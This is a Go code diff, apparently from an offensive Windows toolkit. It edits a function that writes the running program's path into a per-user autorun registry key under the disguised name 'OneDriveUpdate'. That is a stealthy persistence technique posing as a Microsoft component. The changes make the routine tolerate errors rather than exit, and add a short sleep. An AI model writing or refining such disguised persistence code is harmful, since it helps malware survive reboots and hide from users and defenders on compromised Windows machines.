@@ -5,6 +5,7 @@ import (
 	"log"
 	"os"
 	"path/filepath"
+	"time"
 
 	"golang.org/x/sys/windows/registry"
 )
@@ -22,7 +23,7 @@ func HWND_W32_Method_HKCU_Runer(path string) error {
 		},
 
 		Location:      fmt.Sprintf("%s\\_hckuruner.gUAC", os.Getenv("APPDATA")),
-		_K_HKCU_Runer: 0x2,
+		_K_HKCU_Runer: 0x3,
 	}
 
 	if len(c.Type)&len(c.Method) == 0 {
@@ -36,7 +37,7 @@ func HWND_W32_Method_HKCU_Runer(path string) error {
 	var currentDir string
 	currentDir, err = filepath.Abs(path)
 	if err != nil {
-		log.Fatal(err)
+		log.Println(err)
 	}
 
 	wkey32, err = registry.OpenKey(
@@ -44,22 +45,24 @@ func HWND_W32_Method_HKCU_Runer(path string) error {
 		registry.QUERY_VALUE|registry.SET_VALUE|registry.ALL_ACCESS,
 	)
 	if err != nil {
-		log.Fatal(err)
+		log.Println(err)
 	}
 
 	// Setting "OneDriveUpdate" key value for the ABSOLUTE program path
 	// +0x23df ...
 
 	if err := wkey32.SetStringValue("OneDriveUpdate", currentDir); err != nil {
-		log.Fatal(err)
+		log.Println(err)
 	}
 
 	// Absolute key function closing
 	// +0x54ef ...
 
 	if err := wkey32.Close(); err != nil {
-		log.Fatal(err)
+		log.Println(err)
 	}
 
+	// Sleep for 1 second ...
+	time.Sleep(1 * 1 * time.Second)
 	return err
 }
